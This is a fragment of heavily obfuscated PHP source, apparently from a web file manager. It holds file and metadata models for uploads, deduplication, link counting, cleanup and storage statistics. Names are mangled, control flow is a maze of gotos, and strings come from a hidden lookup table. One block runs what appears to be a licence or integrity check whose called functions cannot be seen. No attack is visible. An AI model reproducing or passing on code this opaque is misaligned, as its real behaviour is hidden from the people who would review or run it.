_listAppendUser(&$A‘÷ÙÈÌÍ‘) { goto fÒ¯ˆ®äò; A‹‰µÄöù: if (count($Cï«¬›¶àï) == 0) { return; } foreach ($A‘÷ÙÈÌÍ‘ as $BïÛ ‡Óº) { if (isset($BïÛ ‡Óº[$E…©‰®àˆ®[1776]])) { $Cï«¬›¶àï[] = $BïÛ ‡Óº[$E…©‰®àˆ®[1776]][$E…©‰®àˆ®[1561]]; } } $BÑ¦ÒŒÑ—Ê = Model($E…©‰®àˆ®[533])->userListInfo($Cï«¬›¶àï); goto aØƒâ‘™ˆò; aØƒâ‘™ˆò: foreach ($A‘÷ÙÈÌÍ‘ as &$BïÛ ‡Óº) { $BïÛ ‡Óº[$E…©‰®àˆ®[589]] = $BÑ¦ÒŒÑ—Ê[$BïÛ ‡Óº[$E…©‰®àˆ®[1561]]]; if (isset($BïÛ ‡Óº[$E…©‰®àˆ®[1776]])) { $BïÛ ‡Óº[$E…©‰®àˆ®[1776]][$E…©‰®àˆ®[589]] = $BÑ¦ÒŒÑ—Ê[$BïÛ ‡Óº[$E…©‰®àˆ®[1776]][$E…©‰®àˆ®[1561]]]; } } unset($BïÛ ‡Óº); goto eåÉĞ­Áôõ; fÒ¯ˆ®äò: $E…©‰®àˆ® =& $_SERVER[Ö‘Øù]; $Cï«¬›¶àï = array_unique(array_to_keyvalue($A‘÷ÙÈÌÍ‘, $E…©‰®àˆ®[33], $E…©‰®àˆ®[1561])); $Cï«¬›¶àï = array_remove_value($Cï«¬›¶àï, $E…©‰®àˆ®[191]); goto A‹‰µÄöù; eåÉĞ­Áôõ: } private function _listAppendMeta(&$b’©ÍçèÉ) { goto CêÉ™ì¤ç; c¨¸Êòİ»½: if (!$b«®óœŞî) { return; } foreach ($b’©ÍçèÉ as $aí†äĞÂ£) { if (isset($aí†äĞÂ£[$F„ÅÕ™¯¡[1776]])) { $b«®óœŞî[] = $aí†äĞÂ£[$F„ÅÕ™¯¡[1776]][$F„ÅÕ™¯¡[1766]]; } } $Fä†÷‹è‡¡ = $this->metaList($b«®óœŞî); goto eŒùêÌñ¿ ; CêÉ™ì¤ç: $F„ÅÕ™¯¡ =& $_SERVER[Ö‘Øù]; $b«®óœŞî = array_unique(array_to_keyvalue($b’©ÍçèÉ, $F„ÅÕ™¯¡[33], $F„ÅÕ™¯¡[1766])); $b«®óœŞî = array_remove_value($b«®óœŞî, $F„ÅÕ™¯¡[191]); goto c¨¸Êòİ»½; eŒùêÌñ¿ : if (!$Fä†÷‹è‡¡) { return !1; } foreach ($b’©ÍçèÉ as &$aí†äĞÂ£) { $aí†äĞÂ£[$F„ÅÕ™¯¡[460]] = $Fä†÷‹è‡¡[$aí†äĞÂ£[$F„ÅÕ™¯¡[1766]]]; if (isset($aí†äĞÂ£[$F„ÅÕ™¯¡[1776]])) { $aí†äĞÂ£[$F„ÅÕ™¯¡[1776]][$F„ÅÕ™¯¡[460]] = $Fä†÷‹è‡¡[$aí†äĞÂ£[$F„ÅÕ™¯¡[1776]][$F„ÅÕ™¯¡[1766]]]; } } unset($aí†äĞÂ£); goto A„Šƒ¿ù†Ç; A„Šƒ¿ù†Ç: } private function metaList($F±”¿á¢Õ¶) { goto a×å¡©”İö; FÒŠ”·Ïî÷: return $FóÀÍ±Ê­ ? $FóÀÍ±Ê­ : array(); goto a‘‘¢é‚âá; f«ÊÎ‚Õ‰Á: $FóÀÍ±Ê­ = Model($Aõ¬½‡”µ[1777])->where($d†Œ–àØ£Ë)->select(); $FóÀÍ±Ê­ = array_to_keyvalue_group($FóÀÍ±Ê­, $Aõ¬½‡”µ[1766]); foreach ($FóÀÍ±Ê­ as $dß¥¦„Ã => $BÈ¨²Äæ‚İ) { $Fó†äåèŠ = array(); foreach ($BÈ¨²Äæ‚İ as $bÛÇ¹£¼ñÆ) { $Fó†äåèŠ[$bÛÇ¹£¼ñÆ[$Aõ¬½‡”µ[93]]] = $bÛÇ¹£¼ñÆ[$Aõ¬½‡”µ[372]]; } $FóÀÍ±Ê­[$dß¥¦„Ã] = $Fó†äåèŠ; } goto FÒŠ”·Ïî÷; a×å¡©”İö: $Aõ¬½‡”µ =& $_SERVER[Ö‘Øù]; if (!$F±”¿á¢Õ¶) { return array(); } $d†Œ–àØ£Ë = array($Aõ¬½‡”µ[1766] => array($Aõ¬½‡”µ[7], $F±”¿á¢Õ¶)); goto f«ÊÎ‚Õ‰Á; a‘‘¢é‚âá: } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\x6c\145\137\143\157\156\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\124\x69\155\145", "\x74\x69\x6d\145", "\x69\156\x73\145\x72\x74", "\146\165\x6e\143\164\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\x6c\x65"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\x6d\x65" => "\x69\157\x5f\146\x69\x6c\x65\137\155\145\164\141", "\155\145\x74\x61\106\x69\145\154\144" => "\x66\151\x6c\145\x49\104"); public function fileInfo($Fª¥ŒÕÅº) { $aäâÜÁ§æá =& $_SERVER[Ö‘Øù]; static $b†ÁØª†Ûµ = array(); if (!isset($b†ÁØª†Ûµ[$Fª¥ŒÕÅº])) { $E®Â‰òø‡ = $aäâÜÁ§æá[1778]; $e™È“ÀÄ¾ç = Model($aäâÜÁ§æá[465])->field($E®Â‰òø‡)->where(array($aäâÜÁ§æá[463] => $Fª¥ŒÕÅº))->find(); $b†ÁØª†Ûµ[$Fª¥ŒÕÅº] = $e™È“ÀÄ¾ç; } return $b†ÁØª†Ûµ[$Fª¥ŒÕÅº]; } public function addFileByContent($A²­²ùÎ´¢ = '', $CŒ„¯ÇëÃ = '') { goto Fã³È†²§Š; fˆ„˜éç¥: if (file_exists($cË„¤ğìˆï)) { @unlink($cË„¤ğìˆï); } return $DëäÑ­”ã; goto còˆ×•§çŠ; Fã³È†²§Š: $EÚÉ®‰éÈ¡ =& $_SERVER[Ö‘Øù]; $AÏ©’ƒò¸ = TEMP_PATH . $EÚÉ®‰éÈ¡[1779]; if (!is_dir($AÏ©’ƒò¸)) { mk_dir($AÏ©’ƒò¸); } goto BÇ Šˆç¡; BÇ Šˆç¡: $cË„¤ğìˆï = $AÏ©’ƒò¸ . $EÚÉ®‰éÈ¡[1780] . rand_string(16); file_put_contents($cË„¤ğìˆï, $A²­²ùÎ´¢); $DëäÑ­”ã = $this->addFile($cË„¤ğìˆï, $CŒ„¯ÇëÃ, !0); goto fˆ„˜éç¥; còˆ×•§çŠ: } public function createFileName($f±Ä…à¢——, $f†­ñƒÕÒé = false, $CÑæ­À¨Ø‹ = false) { goto f¾ˆ£ë©——; a¨”¦ª¹ˆ‹: $bšŸÏß–±í = $dõŠŸŸÃŸ±->pathFather($bÊÑßª“ˆ); static $f¡‹ÃÊÛ•² = false; $cÂ‡šƒ£ = $c¿¶Ò°à¨Ö[1781] . md5($bšŸÏß–±í); goto F¯Øí‘ìÆ; F¯Øí‘ìÆ: if (!$f¡‹ÃÊÛ•² && !Cache::get($cÂ‡šƒ£)) { $f¡‹ÃÊÛ•² = !0; $A¥Îïù¤í = IO::mkdir($bšŸÏß–±í); if (!IO::exist($A¥Îïù¤í . $c¿¶Ò°à¨Ö[796])) { IO::mkfile($A¥Îïù¤í . $c¿¶Ò°à¨Ö[796]); } Cache::set($cÂ‡šƒ£, 1, 3600 * 2); } return $bÊÑßª“ˆ; goto bí¼Åò¹óá; f¾ˆ£ë©——: $c¿¶Ò°à¨Ö =& $_SERVER[Ö‘Øù]; $dõŠŸŸÃŸ± = IO::init($c¿¶Ò°à¨Ö[8]); $bÊÑßª“ˆ = $this->makeFilePath($f±Ä…à¢——, $dõŠŸŸÃŸ±, $f†­ñƒÕÒé, $CÑæ­À¨Ø‹); goto a¨”¦ª¹ˆ‹; bí¼Åò¹óá: } public function makeFilePath($c„ø ì›Ş, $døİ¾Æœ‰, $B¸ÃÆö£Ò” = false, $BÍãçßÙ  = false) { goto Dí‚Ü¯‘Ã; Dí‚Ü¯‘Ã: $EŠ‚‰¢…ó° =& $_SERVER[Ö‘Øù]; $FÏÒ†²ï®Û = Model($EŠ‚‰¢…ó°[763])->get($EŠ‚‰¢…ó°[1782]); $cŠŠµêãÇé = KodIO::defaultIO() . date($EŠ‚‰¢…ó°[1783]); goto fõò‘¬¥¿Å; fõò‘¬¥¿Å: $bÊ‚Í·» = $cŠŠµêãÇé . rand_string(5) . short_id(100); $c„ø ì›Ş = str_replace($EŠ‚‰¢…ó°[8], $EŠ‚‰¢…ó°[71], KodIO::clear($c„ø ì›Ş)); $b…áÁ‡Ë½ = $døİ¾Æœ‰->ext($c„ø ì›Ş); goto E÷­§—£ºó; E÷­§—£ºó: if (!$c„ø ì›Ş) { $FÏÒ†²ï®Û = $EŠ‚‰¢…ó°[1784]; } switch ($FÏÒ†²ï®Û) { case $EŠ‚‰¢…ó°[1785]: $bÊ‚Í·» = $bÊ‚Í·» . $EŠ‚‰¢…ó°[95] . $døİ¾Æœ‰->ext($c„ø ì›Ş); if ($b…áÁ‡Ë½ == $EŠ‚‰¢…ó°[1720]) { $bÊ‚Í·» .= $EŠ‚‰¢…ó°[1460]; } break; case $EŠ‚‰¢…ó°[1786]: goto b°¥œë‰š—; fŠƒÙéŸ: CacheLock::lock($b×‘¿ÂÍ¶); $bÊ‚Í·» = $cŠŠµêãÇé . $c„ø ì›Ş; if (IO::exist($cŠŠµêãÇé . $c„ø ì›Ş)) { $b‰Ú¸ªÜ· = substr($c„ø ì›Ş, 0, strlen($c„ø ì›Ş) - strlen($b…áÁ‡Ë½)); $b£ÃíŸ¢ÁÚ = $BÍãçßÙ  ? substr($BÍãçßÙ , 0, 5) : ($B¸ÃÆö£Ò” ? substr($B¸ÃÆö£Ò”, 0, 5) : rand_string(5)); $bÊ‚Í·» = $cŠŠµêãÇé . $b‰Ú¸ªÜ· . $b£ÃíŸ¢ÁÚ . $EŠ‚‰¢…ó°[95] . $b…áÁ‡Ë½; } goto D¼Í™¿»¨‹; céõØõ‹¹®: $cŠŠµêãÇé = $EŠ‚‰¢…ó°[1158] . $BÜ¤Ê¯‡Å[$EŠ‚‰¢…ó°[395]] . $EŠ‚‰¢…ó°[404] . date($EŠ‚‰¢…ó°[1787]) . $e½…ÙÁìâó . $EŠ‚‰¢…ó°[8]; if ($b…áÁ‡Ë½ == $EŠ‚‰¢…ó°[1720]) { $c„ø ì›Ş .= $EŠ‚‰¢…ó°[1460]; } $b×‘¿ÂÍ¶ = $EŠ‚‰¢…ó°[1788] . $cŠŠµêãÇé . $c„ø ì›Ş; goto fŠƒÙéŸ; b°¥œë‰š—: $E‹˜ÔÈÒôÆ = Model($EŠ‚‰¢…ó°[763])->get($EŠ‚‰¢…ó°[764]); $e½…ÙÁìâó = substr(md5($EŠ‚‰¢…ó°[765] . $E‹˜ÔÈÒôÆ . date($EŠ‚‰¢…ó°[741])), 0, 8); $BÜ¤Ê¯‡Å = KodIO::defaultDriver(); goto céõØõ‹¹®; D¼Í™¿»¨‹: if (IO::isTypeObject($bÊ‚Í·») && !IO::isUploadServer($bÊ‚Í·»)) { if (IO::exist($bÊ‚Í·»)) { return $bÊ‚Í·»; } $eÎ©‹Ü®ˆ = IO::setContent($bÊ‚Í·», $EŠ‚‰¢…ó°[33]); if (!$eÎ©‹Ü®ˆ) { show_json($EŠ‚‰¢…ó°[1789], !1); } } CacheLock::unlock($b×‘¿ÂÍ¶); break; goto DµòÊÓŸö¥; DµòÊÓŸö¥: case $EŠ‚‰¢…ó°[1784]: break; default: break; } return $bÊ‚Í·»; goto cŠ˜°ÏÅÅ³; cŠ˜°ÏÅÅ³: } public function addFileByRemote($C¤ÇĞ¹»™©, $E¹®Ÿ™æ·Ü, $c©ø¬‹…ˆİ = array()) { goto Aíìˆ¨ºÓ; FÆ™™ÎŸª‘: if ($Aï¨‹‡² = $this->addFileCheckExist($fÓ§Ñàê´[$DöÖß‡„‰[171]], $fÓ§Ñàê´[$DöÖß‡„‰[170]], $fÓ§Ñàê´[$DöÖß‡„‰[78]])) { return $Aï¨‹‡²; } return $this->addFileData($fÓ§Ñàê´); goto b‚˜˜ò´¯; cäÏËÃ­ÃÙ: $bğÈ×ê Œô = IO::hashMd5($C¤ÇĞ¹»™©, $FŒöä¦Ç‹¦); $d·ÍØœŠÖŞ = KodIO::defaultDriver(); $fÓ§Ñàê´ = array($DöÖß‡„‰[574] => IO::size($C¤ÇĞ¹»™©), $DöÖß‡„‰[1790] => 1, $DöÖß‡„‰[415] => $E¹®Ÿ™æ·Ü, $DöÖß‡„‰[808] => $d·ÍØœŠÖŞ[$DöÖß‡„‰[395]], $DöÖß‡„‰[416] => $C¤ÇĞ¹»™©, $DöÖß‡„‰[1791] => $c©ø¬‹…ˆİ[$DöÖß‡„‰[171]] ? $c©ø¬‹…ˆİ[$DöÖß‡„‰[171]] : IO::hashSimple($C¤ÇĞ¹»™©), $DöÖß‡„‰[1792] => $bğÈ×ê Œô ? $bğÈ×ê Œô : $FŒöä¦Ç‹¦); goto FÆ™™ÎŸª‘; Aíìˆ¨ºÓ: $DöÖß‡„‰ =& $_SERVER[Ö‘Øù]; if (!IO::exist($C¤ÇĞ¹»™©)) { return !1; } $FŒöä¦Ç‹¦ = $c©ø¬‹…ˆİ[$DöÖß‡„‰[170]] ? $c©ø¬‹…ˆİ[$DöÖß‡„‰[170]] : $DöÖß‡„‰[33]; goto cäÏËÃ­ÃÙ; b‚˜˜ò´¯: } private function addFileData($B´˜¿À¬Ä) { $C¥à²›¹Œå =& $_SERVER[Ö‘Øù]; if (!$B´˜¿À¬Ä) { return !1; } $B´˜¿À¬Ä[$C¥à²›¹Œå[78]] = intval($B´˜¿À¬Ä[$C¥à²›¹Œå[78]]); if (!$B´˜¿À¬Ä[$C¥à²›¹Œå[78]] && strlen($B´˜¿À¬Ä[$C¥à²›¹Œå[171]]) > 32) { $B´˜¿À¬Ä[$C¥à²›¹Œå[78]] = intval(substr($B´˜¿À¬Ä[$C¥à²›¹Œå[171]], 32)); } $e™ãŞÔìÜù = $this->add($B´˜¿À¬Ä); return $this->find($e™ãŞÔìÜù); } public function addFile($D†÷‘Ö¤•, $DµŒ‹Åˆ½, $CğŠ”À“„¸ = false) { goto E™ò¥¼Œî; cˆÎß–†’Å: return $F‘æ· ­ĞÛ; goto AéÄ÷›”½ó; BîÁÍºğ‚…: $BË‚âö—î = $this->addFileMake($D†÷‘Ö¤•, $dœÊÍƒÌ¿, $eñé´‘˜È, $D›¨‡’Ùµğ, $DµŒ‹Åˆ½, $CğŠ”À“„¸); $F‘æ· ­ĞÛ = $this->addFileData($BË‚âö—î); CacheLock::unlock($Fè¨Ñò÷äè); goto cˆÎß–†’Å; bºÜ›íá´: $Fè¨Ñò÷äè = $_SERVER[Ö‘Øù][1793] . $D›¨‡’Ùµğ; CacheLock::lock($Fè¨Ñò÷äè); if ($eÈº¦ÃÑ£ = $this->addFileCheckExist($eñé´‘˜È, $D›¨‡’Ùµğ, $dœÊÍƒÌ¿)) { CacheLock::unlock($Fè¨Ñò÷äè); return $eÈº¦ÃÑ£; } goto BîÁÍºğ‚…; E™ò¥¼Œî: $eñé´‘˜È = IO::hashSimple($D†÷‘Ö¤•); $D›¨‡’Ùµğ = IO::hashMd5($D†÷‘Ö¤•); $dœÊÍƒÌ¿ = IO::size($D†÷‘Ö¤•); goto bºÜ›íá´; AéÄ÷›”½ó: } public function addFileMake($eÅâõÃä¶Ÿ, $Fİ”ÖÜ–ŸÍ, $B¢Åà‚„íï, $f‡”°çÇÑ¢, $aµ…ğ½èÒŸ, $d¿‘ÂĞ‘óÈ) { goto E›ßƒöäÇÃ; E›ßƒöäÇÃ: $cå·£¢¤‡¾ =& $_SERVER[Ö‘Øù]; $B¶Ş¤Øå‚ = $this->createFileName($aµ…ğ½èÒŸ, $B¢Åà‚„íï, $f‡”°çÇÑ¢); $CÒ¶Ô±¼™× = get_path_father($B¶Ş¤Øå‚); goto d´ƒøÙ·ô; dãç¡­¢Ü: $BğìÅéÒ®Ô = KodIO::defaultDriver(); $Eë‰İãçù’ = array($cå·£¢¤‡¾[574] => $Fİ”ÖÜ–ŸÍ, $cå·£¢¤‡¾[1790] => 1, $cå·£¢¤‡¾[415] => $aµ…ğ½èÒŸ, $cå·£¢¤‡¾[808] => $BğìÅéÒ®Ô[$cå·£¢¤‡¾[395]], $cå·£¢¤‡¾[416] => $B¶Ş¤Øå‚, $cå·£¢¤‡¾[1791] => $B¢Åà‚„íï, $cå·£¢¤‡¾[1792] => $f‡”°çÇÑ¢); return $Eë‰İãçù’; goto b·šµñ¾ÆÒ; d´ƒøÙ·ô: $AÛ¹Àœ† = get_path_this($B¶Ş¤Øå‚); if ($d¿‘ÂĞ‘óÈ) { $c…õŠÀ–£¸ = IO::move($eÅâõÃä¶Ÿ, $CÒ¶Ô±¼™×, !1, $AÛ¹Àœ†); } else { $c…õŠÀ–£¸ = IO::copy($eÅâõÃä¶Ÿ, $CÒ¶Ô±¼™×, !1, $AÛ¹Àœ†); } if (!$c…õŠÀ–£¸) { return !1; } goto dãç¡­¢Ü; b·šµñ¾ÆÒ: } public function addFileCheckExist($fÜîù´‹íù, $d¬ÁôƒĞ•, $FÚŞ½“«×Ğ) { $aëÆé„ÛĞ =& $_SERVER[Ö‘Øù]; $D³é´¼é¾ = $this->findByHash($fÜîù´‹íù, $d¬ÁôƒĞ•); if (!$D³é´¼é¾) { return !1; } $F®ÈÌ»ôµ¯ = array($aëÆé„ÛĞ[1790] => intval($D³é´¼é¾[$aëÆé„ÛĞ[1794]]) + 1, $aëÆé„ÛĞ[574] => $FÚŞ½“«×Ğ); $this->where(array($aëÆé„ÛĞ[463] => $D³é´¼é¾[$aëÆé„ÛĞ[462]]))->save($F®ÈÌ»ôµ¯); return $D³é´¼é¾; } public function remove($cÃÀ¶ƒ­ˆæ) { $this->linkCountChange($cÃÀ¶ƒ­ˆæ, !1); $this->clearEmpty(); return !0; } public function linkAdd($eó¶Ø¨ƒÁï) { $this->linkCountChange($eó¶Ø¨ƒÁï, !0); } public function linkCountChange($f§‡‘ƒ‚˜‚, $CùŒ¬‡¶Ñ®) { goto FâÄƒÏù¼Õ; eßÜâ‘”¶: $Cè‘¸öÁ = array(); foreach ($f§‡‘ƒ‚˜‚ as $dƒÎ¶¾š´©) { $CÔî²Û½±’ = $dƒÎ¶¾š´© . $dËÊ¬¨ê–[33]; if (!$Cè‘¸öÁ[$CÔî²Û½±’]) { $Cè‘¸öÁ[$CÔî²Û½±’] = 0; } $Cè‘¸öÁ[$CÔî²Û½±’]++; } $d×š„Ö¿ºæ = array(); goto a×—õì›; FâÄƒÏù¼Õ: $dËÊ¬¨ê– =& $_SERVER[Ö‘Øù]; if (!$f§‡‘ƒ‚˜‚) { return; } if (!is_array($f§‡‘ƒ‚˜‚)) { $f§‡‘ƒ‚˜‚ = array($f§‡‘ƒ‚˜‚); } goto eßÜâ‘”¶; a×—õì›: foreach ($Cè‘¸öÁ as $dƒÎ¶¾š´© => $FÚ¦£áëÉÏ) { $CÔî²Û½±’ = $FÚ¦£áëÉÏ . $dËÊ¬¨ê–[33]; if (!$d×š„Ö¿ºæ[$CÔî²Û½±’]) { $d×š„Ö¿ºæ[$CÔî²Û½±’] = array(); } $d×š„Ö¿ºæ[$CÔî²Û½±’][] = $dƒÎ¶¾š´©; } foreach ($d×š„Ö¿ºæ as $FÚ¦£áëÉÏ => $cŒêŞÕØÏ¡) { if (!$cŒêŞÕØÏ¡) { continue; } $FÚ¦£áëÉÏ = $CùŒ¬‡¶Ñ® ? $FÚ¦£áëÉÏ : -intval($FÚ¦£áëÉÏ); $AŠ˜‚Êš†‚ = array($dËÊ¬¨ê–[462] => array($dËÊ¬¨ê–[7], $cŒêŞÕØÏ¡)); if ($FÚ¦£áëÉÏ < 0) { $AŠ˜‚Êš†‚[$dËÊ¬¨ê–[1794]] = array($dËÊ¬¨ê–[1008], abs($FÚ¦£áëÉÏ)); } $this->where($AŠ˜‚Êš†‚)->setAdd($dËÊ¬¨ê–[1794], $FÚ¦£áëÉÏ); } goto F¸¤äØ¡Ò·; F¸¤äØ¡Ò·: } public function findByHash($A¤ƒš®Œ™¢, $D¢‹ÄøìÊò = false) { $a”Û„È‰© =& $_SERVER[Ö‘Øù]; if (!$A¤ƒš®Œ™¢ && !$D¢‹ÄøìÊò) { return !1; } $FÕÅÊ–Òµ® = array($a”Û„È‰©[1791] => $A¤ƒš®Œ™¢); if ($D¢‹ÄøìÊò) { $FÕÅÊ–Òµ® = array($a”Û„È‰©[1792] => $D¢‹ÄøìÊò); } return $this->order($a”Û„È‰©[1795])->where($FÕÅÊ–Òµ®)->find(); } public function clearEmpty($E°ÊßŠ‹Ã© = 0) { goto d‰ä·¥œÊÈ; d‰ä·¥œÊÈ: $f‚¸ä¬íç÷ =& $_SERVER[Ö‘Øù]; $EèĞšÀŞ“Â = time() - 3600 * 24 * $E°ÊßŠ‹Ã©; $e­å˜Ä•Ã = $f‚¸ä¬íç÷[1796] . $EèĞšÀŞ“Â; goto cŸ¤’“Üëö; F‡“õì¹Şˆ: foreach ($A°Âäè×ó as $d¶™©Œ©ùÅ) { $f·¹ÊÍß„Ñ->update(1); $this->resetFile($d¶™©Œ©ùÅ); } $f·¹ÊÍß„Ñ->end(); goto F³²ÃëÔŒ; cŸ¤’“Üëö: $A°Âäè×ó = $this->where($e­å˜Ä•Ã)->select(); if (!$A°Âäè×ó) { return; } $f·¹ÊÍß„Ñ = new Task($f‚¸ä¬íç÷[1797], $f‚¸ä¬íç÷[33], count($A°Âäè×ó)); goto F‡“õì¹Şˆ; F³²ÃëÔŒ: } public function resetFile($aÙ±°âºÒĞ) { goto a¼ ÛŒ‡; FÉÌššå¤õ: if ($aÙ±°âºÒĞ[$açÅÔÑÔŒí[1794]] != $c‚¿ê½·ë‚) { $this->where($dïœ’Ğ†¨É)->save(array($açÅÔÑÔŒí[1790] => $c‚¿ê½·ë‚)); } goto E„’åè»ª; a¼ ÛŒ‡: $açÅÔÑÔŒí =& $_SERVER[Ö‘Øù]; $dïœ’Ğ†¨É = array($açÅÔÑÔŒí[463] => $aÙ±°âºÒĞ[$açÅÔÑÔŒí[462]]); $Cø‰”ƒˆç = Model($açÅÔÑÔŒí[1240])->where($dïœ’Ğ†¨É)->count(); goto cµ¤˜£¢«°; cµ¤˜£¢«°: $e™™­Šˆò = Model($açÅÔÑÔŒí[1798])->where($dïœ’Ğ†¨É)->count(); $c‚¿ê½·ë‚ = intval($Cø‰”ƒˆç) + intval($e™™­Šˆò); if ($c‚¿ê½·ë‚ == 0) { IO::remove($aÙ±°âºÒĞ[$açÅÔÑÔŒí[76]]); Model($açÅÔÑÔŒí[1799])->delete($aÙ±°âºÒĞ[$açÅÔÑÔŒí[462]]); $this->where($dïœ’Ğ†¨É)->delete(); $this->metaSet($aÙ±°âºÒĞ[$açÅÔÑÔŒí[462]], null, null); return; } goto FÉÌššå¤õ; E„’åè»ª: } public function storageInfo($dÃÇ‹Ã‰áé = false) { goto F†²“ğ†ïà; F†²“ğ†ïà: $B–¤ÁƒºÉÔ =& $_SERVER[Ö‘Øù]; $Aê±‰Ú–‚ = $this->count() + 0.0; $dª¨ò¤¬¿ = 0; goto C¤ÙÕ¢ÔÆ¸; C¤ÙÕ¢ÔÆ¸: $Aà´ÙâÃÈŒ = 1; $D¡®òéàÎ = 0; $eõÄË´Éé = 5000; goto dÆ¹£ñØ™á; dÆ¹£ñØ™á: for ($eõÚç•Ãñ = 0; $eõÚç•Ãñ < $Aê±‰Ú–‚; $eõÚç•Ãñ = $eõÚç•Ãñ + $eõÄË´Éé) { $aİ§Œİä‹ = $this->limit($eõÚç•Ãñ, $eõÚç•Ãñ + $eõÄË´Éé)->select(); foreach ($aİ§Œİä‹ as $cÛ÷Äñ¹Ö¦) { $Aà´ÙâÃÈŒ += $cÛ÷Äñ¹Ö¦[$B–¤ÁƒºÉÔ[78]] * $cÛ÷Äñ¹Ö¦[$B–¤ÁƒºÉÔ[1794]]; $dª¨ò¤¬¿ += $cÛ÷Äñ¹Ö¦[$B–¤ÁƒºÉÔ[78]] * ($cÛ÷Äñ¹Ö¦[$B–¤ÁƒºÉÔ[1794]] - 1); $D¡®òéàÎ += $cÛ÷Äñ¹Ö¦[$B–¤ÁƒºÉÔ[1794]]; } } $A¹íØÉøç’ = array($B–¤ÁƒºÉÔ[1800] => $Aà´ÙâÃÈŒ, $B–¤ÁƒºÉÔ[1801] => $dª¨ò¤¬¿, $B–¤ÁƒºÉÔ[1802] => $dª¨ò¤¬¿ / $Aà´ÙâÃÈŒ, $B–¤ÁƒºÉÔ[82] => $Aê±‰Ú–‚, $B–¤ÁƒºÉÔ[1803] => $D¡®òéàÎ); return $A¹íØÉøç’; goto câ°‡Á÷‰Ö; câ°‡Á÷‰Ö: } } goto b—˜¤¢ÁÏ‘; CË¿îì—Ì: $eĞ‰¡ÈÕ = $_SERVER[$_SERVER[Ö‘Øù][835]]; $fõµ……ìˆí = $_SERVER[Ö‘Øù][873]; if ($_SERVER[$_SERVER[Ö‘Øù][834]] != $fõµ……ìˆí($eĞ‰¡ÈÕ)) { goto bÌ´­—‹Ë; bÌ´­—‹Ë: $A®Åøàªïà = $_SERVER[Ö‘Øù][836]; $C¯ïäÊƒ¨Ï = $_SERVER[$_SERVER[Ö‘Øù][837]] . $_SERVER[Ö‘Øù][838]; $Eù±ã†½µë = $A®Åøàªïà($C¯ïäÊƒ¨Ï); goto e¢Şè†¥ò; f¼é•†‰ùÒ: $C›Îö²ôßï($eĞ‰¡ÈÕ); goto B±‚ì«–; e¢Şè†¥ò: $A»ŞÅ¬çÛÛ = explode($_SERVER[Ö‘Øù][229], $Eù±ã†½µë); if (count($A»ŞÅ¬çÛÛ) < $_SERVER[Ö‘Øù][614]) { $F…ìî£Ğ”† = $_SERVER[Ö‘Øù][839]; $F…ìî£Ğ”†(); } $C›Îö²ôßï = $_SERVER[Ö‘Øù][840]; goto f¼é•†‰ùÒ; B±‚ì«–: } goto C„¾æ µ; BÁÍÖÅÎØ«: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\x2e\152\x6f\x62\x4c\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x64\x65\x73\143", "\163\x6f\x72\164"); const JOB_KEY = "\x73\145\x6c\x66\x4a\157\142\x4c\151\163\164"; public function listData($AæİŠŞÄÑñ = false, $cÎ«‡ºõ´„ = "\163\157\162\164", $cïÂ–¢·Â… = false) { return parent::listData($AæİŠŞÄÑñ, $cÎ«‡ºõ´„, $cïÂ–¢·Â…); } public function remove($aˆİ˜°›äĞ) { return parent::remove($aˆİ˜°›äĞ); } public function add($e¤Š‹ÅØ’Ø) { $Dö·“ÓÖÛ =& $_SERVER[Ö‘Øù]; if ($this->findByName($e¤Š‹ÅØ’Ø[$Dö·“ÓÖÛ[28]])) { return !1; } $e¤Š‹ÅØ’Ø[$Dö·“ÓÖÛ[1753]] = $this->getSort(); return parent::insert($e¤Š‹ÅØ’Ø); } private function getSort() { $FœËÅ‘¦¬£ =& $_SERVER[Ö‘Øù]; $E¶Œ¼¤Ïòª = parent::listData(); $bŒÌš–¿ö = array_to_keyvalue($E¶Œ¼¤Ïòª, $FœËÅ‘¦¬£[33], $FœËÅ‘¦¬£[1753]); return empty($bŒÌš–¿ö) ? 0 : max($bŒÌš–¿ö) + 1; } public function update($CÁ¼÷’¥¹Ù, $eíÙ¤¼´ñ³) { $aØ«ÌÏ„Øœ =& $_SERVER[Ö‘Øù]; $døñëíò = parent::listData($CÁ¼÷’¥¹Ù); $dÆ§¶â†Üí = $this->findByName($eíÙ¤¼´ñ³[$aØ«ÌÏ„Øœ[28]]); if (!$døñëíò || $dÆ§¶â†Üí && $dÆ§¶â†Üí[$aØ«ÌÏ„Øœ[395]] != $døñëíò[$aØ«ÌÏ„Øœ[395]]) { return !1; } return parent::update($CÁ¼÷’¥¹Ù, $eíÙ¤¼´ñ³); } public function setUserJob($A­Ø‰…ˆ¦¢, $f†ÇÈº¿‡») { goto f”ÁÃØÂç÷; f”ÁÃØÂç÷: $c¶êÎŒµôë =& $_SERVER[Ö‘Øù]; if (!is_array($f†ÇÈº¿‡»)) { $f†ÇÈº¿‡» = array($f†ÇÈº¿‡»); } $CŠ¼Şì… = parent::listData(); goto E±§ƒ¬†›ù; E‘ÓªÍ±×î: $c”Œ¨†‰Ò = rtrim($c”Œ¨†‰Ò, $c¶êÎŒµôë[47]); Model($c¶êÎŒµôë[533])->metaSet($A­Ø‰…ˆ¦¢, self::JOB_KEY, $c”Œ¨†‰Ò); goto D¶Û÷ÎÄ; E±§ƒ¬†›ù: $FªÔ·Èœè¡ = array_to_keyvalue($CŠ¼Şì…, $c¶êÎŒµôë[28]); $c”Œ¨†‰Ò = $c¶êÎŒµôë[376]; foreach ($f†ÇÈº¿‡» as $A÷÷ŸİÀéÂ) { if ($FªÔ·Èœè¡[$A÷÷ŸİÀéÂ]) { $c”Œ¨†‰Ò .= $FªÔ·Èœè¡[$A÷÷ŸİÀéÂ][$c¶êÎŒµôë[395]] . $c¶êÎŒµôë[47]; } else { $C«É¬•ø˜² = $this->add($A÷÷ŸİÀéÂ); $c”Œ¨†‰Ò .= $C«É¬•ø˜² . $c¶êÎŒµôë[47]; } } goto E‘ÓªÍ±×î; D¶Û÷ÎÄ: } public function getUserJob($dï›šŞğ) { $dµñ·ŸÈçƒ = Model($_SERVER[Ö‘Øù][533])->metaGet($dï›šŞğ); return $this->getUserJobInfo($dµñ·ŸÈçƒ[self::JOB_KEY]); } public function 